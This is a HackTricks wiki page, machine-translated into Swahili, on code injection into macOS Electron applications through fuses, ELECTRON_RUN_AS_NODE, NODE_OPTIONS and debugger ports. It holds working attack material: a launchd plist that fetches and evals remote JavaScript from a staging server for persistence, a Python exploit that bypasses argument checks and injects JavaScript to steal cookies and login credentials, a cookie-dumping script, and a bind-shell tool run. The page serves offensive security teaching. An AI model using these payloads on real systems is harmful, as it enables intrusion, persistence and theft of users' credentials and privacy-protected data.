# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Ikiwa hujui ni nini Electron, unaweza kupata [**habari nyingi hapa**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Lakini kwa sasa jua tu kwamba Electron inatumia **node**.\
Na node ina **parameta** na **mabadiliko ya mazingira** ambayo yanaweza kutumika **kufanya itekeleze msimbo mwingine** mbali na faili iliyoonyeshwa.

### Electron Fuses

Mbinu hizi zitaongelewa baadaye, lakini katika nyakati za hivi karibuni Electron imeongeza **bendera za usalama kuzuia hizo**. Hizi ni [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) na hizi ndizo zinazotumika **kuzuia** programu za Electron katika macOS **kudhani msimbo usio na mpangilio**:

- **`RunAsNode`**: Ikiwa imezimwa, inazuia matumizi ya mabadiliko ya mazingira **`ELECTRON_RUN_AS_NODE`** kuingiza msimbo.
- **`EnableNodeCliInspectArguments`**: Ikiwa imezimwa, parameta kama `--inspect`, `--inspect-brk` hazitazingatiwa. Kuepusha njia hii ya kuingiza msimbo.
- **`EnableEmbeddedAsarIntegrityValidation`**: Ikiwa imewezeshwa, **faili** ya **`asar`** itathibitishwa na macOS. **Kuzuia** njia hii **kuingizwa kwa msimbo** kwa kubadilisha maudhui ya faili hii.
- **`OnlyLoadAppFromAsar`**: Ikiwa hii imewezeshwa, badala ya kutafuta kupakia kwa mpangilio ufuatao: **`app.asar`**, **`app`** na hatimaye **`default_app.asar`**. Itakagua tu na kutumia app.asar, hivyo kuhakikisha kwamba wakati **imeunganishwa** na **`embeddedAsarIntegrityValidation`** fuse haiwezekani **kudhani msimbo usio na uthibitisho**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Ikiwa imewezeshwa, mchakato wa kivinjari unatumia faili inayoitwa `browser_v8_context_snapshot.bin` kwa ajili ya snapshot yake ya V8.

Fuse nyingine ya kuvutia ambayo haitazuia kuingizwa kwa msimbo ni:

- **EnableCookieEncryption**: Ikiwa imewezeshwa, duka la kuki kwenye diski linakuwa limefichwa kwa kutumia funguo za cryptography za kiwango cha OS.

### Checking Electron Fuses

Unaweza **kuangalia bendera hizi** kutoka kwa programu kwa:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Kubadilisha Fuse za Electron

Kama [**nyaraka zinavyosema**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), usanidi wa **Fuse za Electron** umewekwa ndani ya **binary ya Electron** ambayo ina mahali fulani mfuatano wa herufi **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

Katika programu za macOS, hii kwa kawaida iko katika `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Unaweza kupakia faili hii katika [https://hexed.it/](https://hexed.it/) na kutafuta mfuatano wa awali. Baada ya mfuatano huu unaweza kuona katika ASCII nambari "0" au "1" ikionyesha kama kila fuse imezimwa au imewezeshwa. Badilisha tu msimbo wa hex (`0x30` ni `0` na `0x31` ni `1`) ili **kubadilisha thamani za fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Kumbuka kwamba ukijaribu **kuandika upya** **`Electron Framework`** binary ndani ya programu na hizi bytes zimebadilishwa, programu hiyo haitafanya kazi.

## RCE kuongeza msimbo kwenye Programu za Electron

Kunaweza kuwa na **faili za nje za JS/HTML** ambazo Programu ya Electron inatumia, hivyo mshambuliaji anaweza kuingiza msimbo katika faili hizi ambao saini yake haitakaguliwa na kutekeleza msimbo wa kiholela katika muktadha wa programu.

> [!CAUTION]
> Hata hivyo, kwa sasa kuna vizuizi 2:
>
> - Ruhusa ya **`kTCCServiceSystemPolicyAppBundles`** inahitajika kubadilisha Programu, hivyo kwa kawaida hii haiwezekani tena.
> - Faili iliyokusanywa ya **`asap`** kwa kawaida ina fuse **`embeddedAsarIntegrityValidation`** `na` **`onlyLoadAppFromAsar`** `imewezeshwa`
>
> Hii inafanya njia hii ya shambulio kuwa ngumu zaidi (au haiwezekani).

Kumbuka kwamba inawezekana kupita hitaji la **`kTCCServiceSystemPolicyAppBundles`** kwa kunakili programu hiyo kwenye directory nyingine (kama **`/tmp`**), kubadilisha jina la folda **`app.app/Contents`** kuwa **`app.app/NotCon`**, **kubadilisha** faili la **asar** na msimbo wako **mbaya**, kubadilisha jina lake tena kuwa **`app.app/Contents`** na kuitekeleza.

Unaweza kufungua msimbo kutoka kwa faili la asar kwa:
```bash
npx asar extract app.asar app-decomp
```
Na uifunge tena baada ya kuibadilisha na:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE na ELECTRON_RUN_AS_NODE

Kulingana na [**nyaraka**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), ikiwa hii variable ya mazingira imewekwa, itaanzisha mchakato kama mchakato wa kawaida wa Node.js.
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Ikiwa fuse **`RunAsNode`** imezimwa, mabadiliko ya env **`ELECTRON_RUN_AS_NODE`** yataachwa, na hii haitafanya kazi.

### Uingizaji kutoka kwa App Plist

Kama [**ilivyopendekezwa hapa**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), unaweza kutumia mabadiliko haya ya env katika plist ili kudumisha uvumilivu:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE na `NODE_OPTIONS`

Unaweza kuhifadhi payload katika faili tofauti na kuitekeleza:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeOptionsEnvironmentVariable`** ime **zimwa**, app itakuwa **ipuuze** env var **NODE_OPTIONS** inapozinduliwa isipokuwa env variable **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itapuuziliwa mbali ikiwa fuse **`RunAsNode`** imezimwa.
>
> Ikiwa hujaweka **`ELECTRON_RUN_AS_NODE`**, utaona **kosa**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection kutoka kwa App Plist

Unaweza kutumia env variable hii katika plist ili kudumisha kudumu kwa kuongeza funguo hizi:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE na ukaguzi

Kulingana na [**hii**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), ukitekeleza programu ya Electron kwa bendera kama **`--inspect`**, **`--inspect-brk`** na **`--remote-debugging-port`**, **bandari ya ufuatiliaji itafunguliwa** ili uweze kuungana nayo (kwa mfano kutoka Chrome katika `chrome://inspect`) na utaweza **kuingiza msimbo ndani yake** au hata kuzindua michakato mipya.\
Kwa mfano:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
Katika [**hiki blogu**](https://hackerone.com/reports/1274695), ufuatiliaji huu unatumika vibaya ili kufanya chrome isiyo na kichwa **ipakue faili zisizo na mpangilio katika maeneo yasiyo na mpangilio**.

> [!TIP]
> Ikiwa programu ina njia yake ya kawaida ya kuangalia ikiwa mabadiliko ya mazingira au vigezo kama `--inspect` vimewekwa, unaweza kujaribu **kuyapita** katika wakati wa utekelezaji kwa kutumia arg `--inspect-brk` ambayo it **isimamishe utekelezaji** mwanzoni mwa programu na kutekeleza bypass (kuandika upya vigezo au mabadiliko ya mazingira ya mchakato wa sasa kwa mfano).

Ifuatayo ilikuwa exploit ambayo kwa kufuatilia na kutekeleza programu na param `--inspect-brk` ilikuwa inawezekana kuyapita ulinzi wa kawaida iliyo nayo (kuandika upya vigezo vya mchakato ili kuondoa `--inspect-brk`) na kisha kuingiza payload ya JS ili kutupa vidakuzi na akidi kutoka kwa programu:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Ikiwa fuse **`EnableNodeCliInspectArguments`** imezimwa, programu itakuwa **ikiweka kando vigezo vya node** (kama `--inspect`) inapozinduliwa isipokuwa variable ya env **`ELECTRON_RUN_AS_NODE`** imewekwa, ambayo pia itakuwa **ikiwekwa kando** ikiwa fuse **`RunAsNode`** imezimwa.
>
> Hata hivyo, bado unaweza kutumia param **`--remote-debugging-port=9229`** lakini payload ya awali haitafanya kazi kutekeleza michakato mingine.

Kwa kutumia param **`--remote-debugging-port=9222`** inawezekana kuiba baadhi ya taarifa kutoka kwa Programu ya Electron kama **historia** (kwa amri za GET) au **cookies** za kivinjari (kama zinavyokuwa **zimefichuliwa** ndani ya kivinjari na kuna **json endpoint** ambayo itawapa).

Unaweza kujifunza jinsi ya kufanya hivyo [**hapa**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) na [**hapa**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) na kutumia chombo cha kiotomatiki [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) au script rahisi kama:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection from the App Plist

Unaweza kutumia hii env variable katika plist ili kudumisha uvumilivu kwa kuongeza funguo hizi:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

> [!TIP]
> Daemon ya TCC kutoka macOS haichunguzi toleo lililotekelezwa la programu. Hivyo kama huwezi **kuiingiza msimbo katika programu ya Electron** kwa kutumia mbinu zozote za awali unaweza kupakua toleo la awali la APP na kuingiza msimbo ndani yake kwani bado itapata ruhusa za TCC (isipokuwa Trust Cache iizuie).

## Run non JS Code

Mbinu za awali zitakuruhusu kuendesha **msimbo wa JS ndani ya mchakato wa programu ya electron**. Hata hivyo, kumbuka kwamba **mchakato wa watoto unakimbia chini ya wasifu sawa wa sandbox** kama programu ya mzazi na **unapata ruhusa zao za TCC**.\
Hivyo, ikiwa unataka kutumia haki za kuingia ili kufikia kamera au kipaza sauti kwa mfano, unaweza tu **kuendesha binary nyingine kutoka kwa mchakato**.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Chombo [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kinaweza kutumika kwa urahisi ili **kupata programu za electron zenye udhaifu** zilizowekwa na kuingiza msimbo ndani yao. Chombo hiki kitajaribu kutumia mbinu ya **`--inspect`**:

Unahitaji kukiunda mwenyewe na unaweza kuitumia kama hii:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki ilitengenezwa ili kuingilia programu za Electron kwa kubadilisha faili za JavaScript za programu hizo na faili za JavaScript za Loki Command & Control.


## References

- [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{{#include ../../../banners/hacktricks-training.md}}
